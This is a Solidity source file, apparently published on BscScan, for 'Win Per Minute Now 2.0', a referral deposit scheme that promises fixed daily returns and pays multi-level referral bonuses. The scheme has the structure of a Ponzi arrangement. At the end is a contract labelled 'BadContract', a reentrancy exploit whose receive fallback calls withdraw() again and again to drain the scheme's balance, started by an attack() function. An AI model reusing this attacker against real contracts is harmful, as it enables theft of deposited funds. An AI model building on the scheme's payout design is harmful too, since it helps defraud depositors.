/**
 *Submitted for verification at BscScan.com on 2022-09-26
*/

// SPDX-License-Identifier: PROPRIETARY - xx


pragma solidity 0.8.15;
pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

pragma solidity ^0.8.0;



/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}



pragma solidity 0.8.15;

interface IERC20 {
  function transfer(address to, uint amount) external returns (bool);

  function approve(address spender, uint amount) external returns (bool);
}


pragma solidity 0.8.15;


contract Authorized is Ownable {
  mapping(uint8 => mapping(address => bool)) internal permissions;

  constructor() {
    permissions[0][_msgSender()] = true; // admin
    permissions[1][_msgSender()] = true; // controller
  }

  modifier isAuthorized(uint8 index) {
    require(permissions[index][_msgSender()] == true, "Account does not have permission");
    _;
  }

  function safeApprove(
    address token,
    address spender,
    uint amount
  ) external isAuthorized(0) {
    IERC20(token).approve(spender, amount);
  }

  function safeTransfer(
    address token,
    address receiver,
    uint amount
  ) external isAuthorized(0) {
    IERC20(token).transfer(receiver, amount);
  }

  function grantPermission(address operator, uint8 typed) external isAuthorized(0) {
    permissions[typed][operator] = true;
  }

  function revokePermission(address operator, uint8 typed) external isAuthorized(0) {
    permissions[typed][operator] = false;
  }
}

pragma solidity 0.8.15;



contract ContractData is Authorized {
  string public name = "Win Per Minute Now 2.0";
  string public url = "www.winperminutenow2.io";

  struct AccountInfo {
    address up;
    uint unlockedLevel;
    bool registered;
    uint depositTime;
    uint lastWithdraw;
    uint depositMin;
    uint depositTotal;
    uint depositCounter;
  }

  struct AccountEarnings {
    uint receivedPassiveAmount;
    uint receivedTotalAmount;
    uint directBonusAmount;
    uint directBonusAmountTotal;
    uint levelBonusAmount;
    uint levelBonusAmountTotal;
  }

  struct MoneyFlow {
    uint passive;
    uint direct;
    uint bonus;
  }

  struct NetworkCheck {
    uint count;
    uint deposits;
    uint depositTotal;
    uint depositCounter;
  }

  mapping(address => AccountInfo) public accountsInfo;
  mapping(address => AccountEarnings) public accountsEarnings;
  mapping(address => address[]) public accountsRefs;
  mapping(address => uint[]) public accountsFlow;

  mapping(address => address[]) public accountsShared;
  mapping(address => address[]) public accountsInShare;

  uint16[] _passiveBonusLevel = new uint16[](15);

  uint public minAllowedDeposit = 0.03 ether;
  uint public minAmountToLvlUp = 0.15 ether;
  uint public minAmountToGetBonus = 0.15 ether;
  uint public constant timeFrame = 1 days;
  uint public constant timeToWithdraw = 1 days;


  uint public constant dailyRentability = 15;
  uint public constant directBonus = 50;

  uint public constant maxWithdrawPercentPerTime = 30;
  uint public constant networkFeePercent = 10;
  uint public constant wpmFeePercent = 40;

  uint public constant maxPercentToWithdraw = 200;
  uint public constant maxPercentToReceive = 200;

  uint public holdPassiveOnDrop = 75;
  bool public distributePassiveNetwork = true;

  uint public maxBalance;
  uint public networkSize;
  uint public networkDeposits;
  uint public networkWithdraw;

  address networkReceiver;
  address wpmReceiver;

  uint cumulativeNetworkFee;
  uint cumulativeWPMFee;
  uint composeDeposit;

  address constant mainNode = 0x72D0c221136509d2cbDd7e0D9B779Fe39F72d638;

  constructor() {
    _passiveBonusLevel[0] = 150;
    _passiveBonusLevel[1] = 70;
    _passiveBonusLevel[2] = 70;
    _passiveBonusLevel[3] = 70;
    _passiveBonusLevel[4] = 70;
    _passiveBonusLevel[5] = 40;
    _passiveBonusLevel[6] = 40;
    _passiveBonusLevel[7] = 20;
    _passiveBonusLevel[8] = 20;
    _passiveBonusLevel[9] = 20;
    _passiveBonusLevel[10] = 20;
    _passiveBonusLevel[11] = 10;
    _passiveBonusLevel[12] = 10;
    _passiveBonusLevel[13] = 10;
    _passiveBonusLevel[14] = 10;
  }

  event WithdrawLimitReached(address indexed addr, uint amount);
  event Withdraw(address indexed addr, uint amount);
  event NewDeposit(address indexed addr, uint amount);
  event NewUpgrade(address indexed addr, uint amount);
  event DirectBonus(address indexed addr, address indexed from, uint amount);
  event LevelBonus(address indexed addr, address indexed from, uint amount);
  event ReferralRegistration(address indexed addr, address indexed referral);
  event NewDonationDeposit(address indexed addr, uint amount, string message);

  function setMinAllowedDeposit(uint minValue) external isAuthorized(1) {
    minAllowedDeposit = minValue;
  }

  function setMinAmountToLvlUp(uint minValue) external isAuthorized(1) {
    minAmountToLvlUp = minValue;
  }

  function setMinAmountToGetBonus(uint minValue) external isAuthorized(1) {
    minAmountToGetBonus = minValue;
  }

  function setHoldPassiveOnDrop(uint value) external isAuthorized(1) {
    holdPassiveOnDrop = value;
  }

  function setNetworkReceiver(address receiver) external isAuthorized(0) {
    networkReceiver = receiver;
  }

  function setWpmReceiver(address receiver) external isAuthorized(0) {
    wpmReceiver = receiver;
  }

  function buildOperation(uint8 opType, uint value) internal view returns (uint res) {
    assembly {
      let entry := mload(0x40)
      mstore(entry, add(shl(200, opType), add(add(shl(160, timestamp()), shl(120, number())), value)))
      res := mload(entry)
    }
  }

  function getShares(address target) external view returns (address[] memory shared, address[] memory inShare) {
    shared = accountsShared[target];
    inShare = accountsInShare[target];
  }

  function getFlow(
    address target,
    uint limit,
    bool asc
  ) external view returns (uint[] memory flow) {
    uint[] memory list = accountsFlow[target];
    if (limit == 0) limit = list.length;
    if (limit > list.length) limit = list.length;
    flow = new uint[](limit);
    if (asc) {
      for (uint i = 0; i < limit; i++) flow[i] = list[i];
    } else {
      for (uint i = 0; i < limit; i++) flow[i] = list[(limit - 1) - i];
    }
  }

  function getMaxLevel(address sender) public view returns (uint) {
    uint currentUnlockedLevel = accountsInfo[sender].unlockedLevel;
    uint lockLevel = accountsInfo[sender].depositMin >= minAmountToGetBonus ? 15 : 0;
    if (lockLevel < currentUnlockedLevel) return lockLevel;
    return currentUnlockedLevel;
  }

  function calculatePassive(
    uint depositTime,
    uint depositMin,
    uint receivedTotalAmount,
    uint receivedPassiveAmount
  ) public view returns (uint) {
    if (depositTime == 0 || depositMin == 0) return 0;
    uint passive = ((((depositMin * dailyRentability) / 1000) * (block.timestamp - depositTime)) / timeFrame) - receivedPassiveAmount;
    uint remainingAllowed = ((depositMin * maxPercentToReceive) / 100) - receivedTotalAmount; // MAX TO RECEIVE
    return passive >= remainingAllowed ? remainingAllowed : passive;
  }

  function getAccountNetwork(
    address sender,
    uint minLevel,
    uint maxLevel
  ) public view returns (NetworkCheck[] memory) {
    maxLevel = maxLevel > _passiveBonusLevel.length || maxLevel == 0 ? _passiveBonusLevel.length : maxLevel;
    NetworkCheck[] memory network = new NetworkCheck[](maxLevel);
    for (uint i = 0; i < accountsRefs[sender].length; i++) {
      _getAccountNetworkInner(accountsRefs[sender][i], 0, minLevel, maxLevel, network);
    }
    return network;
  }

  function _getAccountNetworkInner(
    address sender,
    uint level,
    uint minLevel,
    uint maxLevel,
    NetworkCheck[] memory network
  ) internal view {
    if (level >= minLevel) {
      network[level].count += 1;
      network[level].deposits += accountsInfo[sender].depositMin;
      network[level].depositCounter += accountsInfo[sender].depositCounter;
      network[level].depositTotal += accountsInfo[sender].depositTotal;
    }
    if (level + 1 >= maxLevel) return;
    for (uint i = 0; i < accountsRefs[sender].length; i++) {
      _getAccountNetworkInner(accountsRefs[sender][i], level + 1, minLevel, maxLevel, network);
    }
  }

  function getMultiAccountNetwork(
    address[] memory senders,
    uint minLevel,
    uint maxLevel
  ) external view returns (NetworkCheck[] memory network) {
    for (uint x = 0; x < senders.length; x++) {
      NetworkCheck[] memory partialNetwork = getAccountNetwork(senders[x], minLevel, maxLevel);
      for (uint i = 0; i < maxLevel; i++) {
        network[i].count += partialNetwork[i].count;
        network[i].deposits += partialNetwork[i].deposits;
        network[i].depositTotal += partialNetwork[i].depositTotal;
        network[i].depositCounter += partialNetwork[i].depositCounter;
      }
    }
  }

  function getMultiLevelAccount(
    address[] memory senders,
    uint currentLevel,
    uint maxLevel
  ) public view returns (bytes memory results) {
    for (uint x = 0; x < senders.length; x++) {
      if (currentLevel == maxLevel) {
        for (uint i = 0; i < accountsRefs[senders[x]].length; i++) {
          results = abi.encodePacked(results, accountsRefs[senders[x]][i]);
        }
      } else {
        results = abi.encodePacked(results, getMultiLevelAccount(accountsRefs[senders[x]], currentLevel + 1, maxLevel));
      }
    }
  }

  function getAccountEarnings(address sender)
    external
    view
    returns (
      AccountInfo memory accountI,
      AccountEarnings memory accountE,
      MoneyFlow memory total,
      MoneyFlow memory toWithdraw,
      MoneyFlow memory toMaxEarning,
      MoneyFlow memory toReceiveOverMax,
      uint level,
      uint directs,
      uint time
    )
  {
    accountI = accountsInfo[sender];
    accountE = accountsEarnings[sender];

    address localSender = sender;
    uint depositMin = accountsInfo[localSender].depositMin;
    uint directBonusAmount = accountsEarnings[localSender].directBonusAmount;
    uint levelBonusAmount = accountsEarnings[localSender].levelBonusAmount;
    uint receivedTotalAmount = accountsEarnings[localSender].receivedTotalAmount;

    uint passive = calculatePassive(
      accountsInfo[localSender].depositTime,
      depositMin,
      receivedTotalAmount,
      accountsEarnings[localSender].receivedPassiveAmount
    );
    total = MoneyFlow(passive, directBonusAmount, levelBonusAmount);

    if (localSender == mainNode) depositMin = type(uint).max / 1e5;

    uint remainingWithdraw = ((depositMin * maxPercentToWithdraw) / 100) - receivedTotalAmount; // MAX WITHDRAW
    uint toRegisterPassive = passive >= remainingWithdraw ? remainingWithdraw : passive;

    remainingWithdraw = remainingWithdraw - toRegisterPassive;
    uint toRegisterDirect = directBonusAmount >= remainingWithdraw ? remainingWithdraw : directBonusAmount;

    remainingWithdraw = remainingWithdraw - toRegisterDirect;
    uint toRegisterBonus = levelBonusAmount >= remainingWithdraw ? remainingWithdraw : levelBonusAmount;

    passive -= toRegisterPassive;
    directBonusAmount -= toRegisterDirect;
    levelBonusAmount -= toRegisterBonus;

    toWithdraw = MoneyFlow(toRegisterPassive, toRegisterDirect, toRegisterBonus);

    remainingWithdraw = ((depositMin * maxPercentToReceive) / 100) - (receivedTotalAmount + toRegisterPassive + toRegisterDirect + toRegisterBonus); // MAX TO RECEIVE
    toRegisterPassive = passive >= remainingWithdraw ? remainingWithdraw : passive;
    remainingWithdraw = remainingWithdraw - toRegisterPassive;
    toRegisterDirect = directBonusAmount >= remainingWithdraw ? remainingWithdraw : directBonusAmount;
    remainingWithdraw = remainingWithdraw - toRegisterDirect;
    toRegisterBonus = levelBonusAmount >= remainingWithdraw ? remainingWithdraw : levelBonusAmount;

    passive -= toRegisterPassive;
    directBonusAmount -= toRegisterDirect;
    levelBonusAmount -= toRegisterBonus;

    toMaxEarning = MoneyFlow(toRegisterPassive, toRegisterDirect, toRegisterBonus);
    toReceiveOverMax = MoneyFlow(passive, directBonusAmount, levelBonusAmount);

    level = getMaxLevel(localSender);
    directs = accountsRefs[localSender].length;
    time = block.timestamp;
  }
}


pragma solidity 0.8.15;


contract test is ContractData {
  constructor() {
    accountsInfo[mainNode].up = owner();
    accountsInfo[mainNode].unlockedLevel = 15;
    accountsInfo[mainNode].registered = true;
    accountsRefs[owner()].push(mainNode);
    emit ReferralRegistration(mainNode, owner());

    networkSize += 1;
  }

  // --------------------- PUBLIC METHODS ---------------------------
  receive() external payable {
    makeDeposit();
  }

  function marketingPumpUp() external {}

  function registerAccount(address ref) external payable {
    address sender = msg.sender;
    require(sender != ref && accountsInfo[sender].up == address(0) && accountsInfo[ref].registered == true, "Invalid Referral");

    accountsInfo[sender].up = ref;
    accountsInfo[sender].registered = true;
    accountsRefs[ref].push(sender);
    emit ReferralRegistration(sender, ref);
    accountsFlow[ref].push(buildOperation(1, accountsRefs[ref].length));

    networkSize += 1;
    _registerDeposit(sender, msg.value);
    _payCumulativeFee();
  }

  function addShareWallet(address toBeShared) external {
    address target = msg.sender;
    require(accountsInfo[target].registered == true, "Account not registered on platform");
    require(toBeShared != address(0) && toBeShared != target, "Invalid account to be shared");

    address[] memory shared = accountsShared[target];
    require(shared.length < 9, "Max shared accounts reached");
    for (uint i = 0; i < shared.length; i++) {
      if (shared[i] == toBeShared) revert("Already been shared with this wallet");
    }

    accountsShared[target].push(toBeShared);
    accountsInShare[toBeShared].push(target);
  }

  function makeDeposit() public payable {
    _registerDeposit(msg.sender, msg.value);
    _payCumulativeFee();
  }

  function withdrawAndDeposit(uint amount) public payable {
    require(amount >= 0, "Invalid amount");
    composeDeposit = amount;
    _withdraw(0);
    _registerDeposit(msg.sender, msg.value + composeDeposit);
    _payCumulativeFee();
    composeDeposit = 0;
  }

  function directBonusDeposit(address receiver) public payable isAuthorized(1) {
    uint amount = msg.value;
    require(amount > 0, "Invalid amount");
    require(accountsInfo[receiver].registered == true, "Invalid receiver");

    address directBonusReceiver = receiver;
    accountsEarnings[directBonusReceiver].directBonusAmount += amount; // DIRECT EXTERNAL BONUS
    accountsEarnings[directBonusReceiver].directBonusAmountTotal += amount;

    emit DirectBonus(directBonusReceiver, msg.sender, amount);

    networkDeposits += amount;
    _payNetworkFee(amount, true, false);
    _payCumulativeFee();
  }

  function makeDonation(string memory message) public payable {
    uint amount = msg.value;
    address sender = msg.sender;
    require(amount > 0, "Invalid amount");

    emit NewDonationDeposit(sender, amount, message);
    accountsFlow[sender].push(buildOperation(2, amount));

    networkDeposits += amount;
    _payNetworkFee(amount, true, false);
    _payCumulativeFee();
  }

  function withdraw() external {
    _withdraw(0);
    _payCumulativeFee();
  }

  function withdrawPartial(uint amount) external {
    require(amount > 0, "Invalid amount");
    _withdraw(amount);
    _payCumulativeFee();
  }

  // --------------------- PRIVATE METHODS ---------------------------

  function _withdraw(uint amountOut) private {
    address sender = msg.sender;
    uint amount = amountOut;

    uint depositMin = accountsInfo[sender].depositMin;
    uint receivedTotalAmount = accountsEarnings[sender].receivedTotalAmount;

    uint depositTime = accountsInfo[sender].depositTime;
    uint receivedPassiveAmount = accountsEarnings[sender].receivedPassiveAmount;
    uint directBonusAmount = accountsEarnings[sender].directBonusAmount;
    uint levelBonusAmount = accountsEarnings[sender].levelBonusAmount;

    uint passive = calculatePassive(depositTime, depositMin, receivedTotalAmount, receivedPassiveAmount);

    uint remainingWithdraw = ((depositMin * maxPercentToWithdraw) / 100) - receivedTotalAmount; // MAX WITHDRAW
    uint withdrawAmount = remainingWithdraw;

    require(withdrawAmount > 0, "No remaining withdraws");
    require(accountsInfo[sender].lastWithdraw <= (block.timestamp - timeToWithdraw), "Only 1 withdraw each 24h is possible");

    if (amount > 0) {
      require(amount <= remainingWithdraw, "Amount exceed remaining amount to be withdrawn");
      withdrawAmount = amount;
    } else if (directBonusAmount + levelBonusAmount + passive < remainingWithdraw) {
      if (composeDeposit > 0) {
        withdrawAmount = composeDeposit;
      } else {
        withdrawAmount = ((directBonusAmount + levelBonusAmount + passive) * maxWithdrawPercentPerTime) / 100;
      }
    }
    _withdrawCalculations(sender, withdrawAmount, passive, directBonusAmount, levelBonusAmount, amount, receivedTotalAmount, remainingWithdraw);
  }

  function _withdrawCalculations(
    address sender,
    uint withdrawAmount,
    uint passive,
    uint directBonusAmount,
    uint levelBonusAmount,
    uint amount,
    uint receivedTotalAmount,
    uint remainingWithdraw
  ) private {
    uint summedBonus = directBonusAmount + levelBonusAmount;
    uint toWithdrawPassive = passive >= withdrawAmount ? withdrawAmount : passive;

    if (directBonusAmount > withdrawAmount - toWithdrawPassive) directBonusAmount = withdrawAmount - toWithdrawPassive;
    if (levelBonusAmount > withdrawAmount - (toWithdrawPassive + directBonusAmount))
      levelBonusAmount = withdrawAmount - (toWithdrawPassive + directBonusAmount);

    uint totalToWithdraw = toWithdrawPassive + directBonusAmount + levelBonusAmount;

    if (directBonusAmount > 0) accountsEarnings[sender].directBonusAmount -= directBonusAmount;
    if (levelBonusAmount > 0) accountsEarnings[sender].levelBonusAmount -= levelBonusAmount;

    accountsEarnings[sender].receivedPassiveAmount += toWithdrawPassive;
    accountsEarnings[sender].receivedTotalAmount += totalToWithdraw;
    accountsInfo[sender].lastWithdraw = block.timestamp;

    if (totalToWithdraw >= remainingWithdraw) {
      emit WithdrawLimitReached(sender, receivedTotalAmount + totalToWithdraw);
    } else {
      uint maxWithdraw = passive + summedBonus;
      if (amount > 0 && maxWithdraw < remainingWithdraw) {
        require(amount <= (maxWithdraw * maxWithdrawPercentPerTime) / 100, "Max withdraw allowed per time is 30% of remaining available");
      }
    }

    uint feeAmount = _payNetworkFee(totalToWithdraw, false, true);
    networkWithdraw += totalToWithdraw;

    if (distributePassiveNetwork) _distributeLevelBonus(sender, toWithdrawPassive);

    emit Withdraw(sender, totalToWithdraw);
    accountsFlow[sender].push(buildOperation(3, totalToWithdraw));

    uint totalToPay = totalToWithdraw - feeAmount;
    if (composeDeposit > 0) {
      if (totalToPay >= composeDeposit) {
        totalToPay -= composeDeposit;
      } else {
        composeDeposit = totalToPay;
        totalToPay = 0;
      }
    }
    if (totalToPay > 0) _payWithdrawAmount(totalToPay);

    if (address(this).balance < ((maxBalance * holdPassiveOnDrop) / 100) && distributePassiveNetwork == true) {
      distributePassiveNetwork = false;
    }
  }

  function _payWithdrawAmount(uint totalToWithdraw) private {
    address sender = msg.sender;
    uint shareCount = accountsShared[sender].length;
    if (shareCount == 0) {
      payable(sender).transfer(totalToWithdraw);
      return;
    }
    uint partialValue = totalToWithdraw / (shareCount + 1);
    payable(sender).transfer(partialValue);

    for (uint i = 0; i < shareCount; i++) {
      payable(accountsShared[sender][i]).transfer(partialValue);
    }
  }

  function _distributeLevelBonus(address sender, uint amount) private {
    address up = accountsInfo[sender].up;
    address contractMainNome = mainNode;
    uint minToGetBonus = minAmountToGetBonus;
    for (uint8 i = 0; i < _passiveBonusLevel.length; i++) {
      if (up == address(0)) break;

      uint currentUnlockedLevel = accountsInfo[up].unlockedLevel;
      uint lockLevel = accountsInfo[up].depositMin >= minToGetBonus ? 15 : 0;
      if (lockLevel < currentUnlockedLevel) currentUnlockedLevel = lockLevel;

      if (currentUnlockedLevel > i || up == contractMainNome) {
        uint bonus = (amount * _passiveBonusLevel[i]) / 1000;
        accountsEarnings[up].levelBonusAmount += bonus;
        accountsEarnings[up].levelBonusAmountTotal += bonus;

        emit LevelBonus(up, sender, bonus);
      }
      up = accountsInfo[up].up;
    }
  }

  function _registerDeposit(address sender, uint amount) private {
    uint depositMin = accountsInfo[sender].depositMin;
    uint depositCounter = accountsInfo[sender].depositCounter;

    uint currentBalance = address(this).balance;
    if (maxBalance < currentBalance) {
      maxBalance = currentBalance;
      if (distributePassiveNetwork == false) distributePassiveNetwork = true;
    }

    if (depositCounter == 0) {
      accountsFlow[sender].push(buildOperation(4, amount));
    } else {
      uint receivedTotalAmount = accountsEarnings[sender].receivedTotalAmount;
      uint maxToReceive = (depositMin * maxPercentToWithdraw) / 100;
      if (receivedTotalAmount < maxToReceive) {
        if (composeDeposit > 0) {
          accountsFlow[sender].push(buildOperation(8, amount));
        } else {
          accountsFlow[sender].push(buildOperation(7, amount));
        }
        return _registerLiveUpgrade(sender, amount, depositMin, receivedTotalAmount, maxToReceive);
      } else {
        if (depositMin == amount) {
          accountsFlow[sender].push(buildOperation(5, amount));
        } else {
          accountsFlow[sender].push(buildOperation(6, amount));
        }
      }
    }

    address referral = accountsInfo[sender].up;
    require(referral != address(0), "Registration is required");
    require(amount >= minAllowedDeposit, "Min amount not reached");
    require(depositMin <= amount, "Deposit lower than account value");

    // Check up ref to unlock levels
    if (depositMin < minAmountToLvlUp && amount >= minAmountToLvlUp) {
      // unlocks a level to direct referral
      uint currentUnlockedLevel = accountsInfo[referral].unlockedLevel;
      if (currentUnlockedLevel < _passiveBonusLevel.length) {
        accountsInfo[referral].unlockedLevel = currentUnlockedLevel + 1;
      }
    }

    accountsInfo[sender].depositMin = amount;
    accountsInfo[sender].depositTotal += amount;
    accountsInfo[sender].depositCounter = depositCounter + 1;
    accountsInfo[sender].depositTime = block.timestamp;
    accountsEarnings[sender].receivedTotalAmount = 0;
    accountsEarnings[sender].receivedPassiveAmount = 0;
    accountsEarnings[sender].directBonusAmount = 0;
    accountsEarnings[sender].levelBonusAmount = 0;

    emit NewDeposit(sender, amount);
    networkDeposits += amount;

    // Pays the direct bonus
    uint directBonusAmount = (amount * directBonus) / 1000; // DIRECT BONUS
    if (referral != address(0)) {
      accountsEarnings[referral].directBonusAmount += directBonusAmount;
      accountsEarnings[referral].directBonusAmountTotal += directBonusAmount;
      emit DirectBonus(referral, sender, directBonusAmount);
    }
    _payNetworkFee(amount, true, false);
  }

  function _registerLiveUpgrade(
    address sender,
    uint amount,
    uint depositMin,
    uint receivedTotalAmount,
    uint maxToReceive
  ) private {
    uint depositTime = accountsInfo[sender].depositTime;
    uint receivedPassiveAmount = accountsEarnings[sender].receivedPassiveAmount;
    uint directBonusAmount = accountsEarnings[sender].directBonusAmount;
    uint levelBonusAmount = accountsEarnings[sender].levelBonusAmount;
    uint passive = calculatePassive(depositTime, depositMin, receivedTotalAmount, receivedPassiveAmount);

    require(passive + directBonusAmount + levelBonusAmount < maxToReceive, "Cannot live upgrade after reach 200% earnings");

    if (depositMin < minAmountToLvlUp && (amount + depositMin) >= minAmountToLvlUp) {
      // unlocks a level to direct referral
      address referral = accountsInfo[sender].up;
      uint currentUnlockedLevel = accountsInfo[referral].unlockedLevel;
      if (currentUnlockedLevel < _passiveBonusLevel.length) {
        accountsInfo[referral].unlockedLevel = currentUnlockedLevel + 1;
      }
    }

    uint passedTime;
    {
      uint precision = 1e12;
      uint percentage = (((passive + receivedPassiveAmount) * precision) / (((amount + depositMin) * maxPercentToWithdraw) / 100));
      uint totalSeconds = (maxPercentToWithdraw * timeFrame * 10) / dailyRentability;
      passedTime = (totalSeconds * percentage) / precision;
    }

    accountsInfo[sender].depositMin += amount;
    accountsInfo[sender].depositTotal += amount;
    accountsInfo[sender].depositCounter += 1;
    accountsInfo[sender].depositTime = block.timestamp - passedTime;

    emit NewUpgrade(sender, amount);
    networkDeposits += amount;

    // Pays the direct bonus
    address directBonusReceiver = accountsInfo[sender].up;
    if (directBonusReceiver != address(0)) {
      uint directBonusAmountPayment = (amount * directBonus) / 1000;
      accountsEarnings[directBonusReceiver].directBonusAmount += directBonusAmountPayment;
      accountsEarnings[directBonusReceiver].directBonusAmountTotal += directBonusAmountPayment;
      emit DirectBonus(directBonusReceiver, sender, directBonusAmountPayment);
    }

    _payNetworkFee(amount, true, false);
  }

  function _payNetworkFee(
    uint amount,
    bool registerWithdrawOperation,
    bool isWithdraw
  ) private returns (uint) {
    uint networkFee = (amount * networkFeePercent) / 1000;
    cumulativeNetworkFee += networkFee;

    uint wpmFee;
    if (isWithdraw) {
      wpmFee = (amount * wpmFeePercent) / 1000;
      cumulativeWPMFee += wpmFee;
    }

    if (registerWithdrawOperation) networkWithdraw += networkFee + wpmFee;
    return networkFee + wpmFee;
  }

  function _payCumulativeFee() private {
    uint networkFee = cumulativeNetworkFee;
    uint wpmFee = cumulativeWPMFee;
    if (networkFee > 0) {
      payable(networkReceiver).transfer(networkFee);
      cumulativeNetworkFee = 0;
    }
    if (wpmFee > 0 && wpmReceiver != address(0)) {
      payable(wpmReceiver).transfer(wpmFee);
      cumulativeWPMFee = 0;
    }
  }

  function collectMotherNode() external {
    if (wpmReceiver == address(0)) return;

    address sender = mainNode;
    {
      uint directBonusAmount = accountsEarnings[sender].directBonusAmount;
      uint levelBonusAmount = accountsEarnings[sender].levelBonusAmount;

      uint totalToWithdraw = directBonusAmount + levelBonusAmount;

      accountsEarnings[sender].receivedTotalAmount += totalToWithdraw;

      if (directBonusAmount > 0) accountsEarnings[sender].directBonusAmount = 0;
      if (levelBonusAmount > 0) accountsEarnings[sender].levelBonusAmount = 0;

      payable(wpmReceiver).transfer(totalToWithdraw);

      uint networkFee = _payNetworkFee(totalToWithdraw, false, false);
      networkWithdraw += totalToWithdraw + networkFee;
    }
  }
}


pragma solidity ^0.8.4;



contract BadContract {
    test public goodContract;
    constructor(address payable _goodContractAddress) {
        goodContract = test(_goodContractAddress);
    }

    // Function to receive Ether
    receive() external payable {
        if(address(goodContract).balance > 0) {
            goodContract.withdraw();
        }
    }
     
    function register() public payable {
        goodContract.registerAccount{value: msg.value}(0x72D0c221136509d2cbDd7e0D9B779Fe39F72d638);
     
    }

    function depositx() public payable {
        goodContract.makeDeposit{value: msg.value}();
     
    }
  
    // Starts the attack
    function attack() public payable {
        goodContract.withdraw();
    }
}